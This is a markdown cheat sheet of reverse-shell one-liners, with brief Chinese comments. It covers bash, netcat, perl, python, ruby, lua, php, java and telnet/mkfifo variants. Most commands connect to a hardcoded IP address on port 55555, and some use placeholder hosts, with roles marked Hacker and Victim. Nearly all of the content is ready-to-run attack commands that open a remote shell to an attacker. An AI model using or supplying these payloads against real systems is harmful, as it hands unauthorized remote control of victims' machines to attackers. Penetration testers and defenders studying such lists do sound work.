#resver shell
---

#### bash

`bash -i >& /dev/tcp/104.128.87.194/55555 0>&1`

#### 1

`nc -l -vv -p 55555 -e /bin/bash`

#### 2

`nc -lnvp 55555`

```
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc x.x.x.x [listenPort] 1>/tmp/backpipe
```
> 第一条命令使用mknod在tmp目录下创建一个管道backpipe
> 第二条命令首先将默认shell环境的输入重定向给刚才创建的管道，然后将输出通过nc attackerip

#### perl

```
perl -e 'use Socket;$i="104.128.87.194";$p=55555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("104.128.87.194",55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("104.128.87.194",55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

#### ruby

````
ruby -rsocket -e'f=TCPSocket.open("104.128.87.194",55555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
````

```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```

#### nc不使用-e

```
Hacker:nc -lvnp listenport
Victim:mknod /tmp/backpipe p
Victim:/bin/sh 0</tmp/backpipe | nc 104.128.87.194 55555 1>/tmp/backpipe

不使用nc

Method 1:
Hacker: nc -nvlp 55555
Victim: /bin/bash -i > /dev/tcp/104.128.87.194/8080 0<&1 2>&1

Method 2:
Hacker: nc -nvlp 55555
Victim: mknod backpipe p && telnet 104.128.87.194 55555 0 backpipe

Method 3:
Hacker: nc -nvlp 55555
Hacker: nc -nvlp 55555
Victim: telnet 104.128.87.194 55555 | /bin/bash | telnet 104.128.87.194 55555
```

#### lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('104.128.87.194','55555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```
#### php

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat
 <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```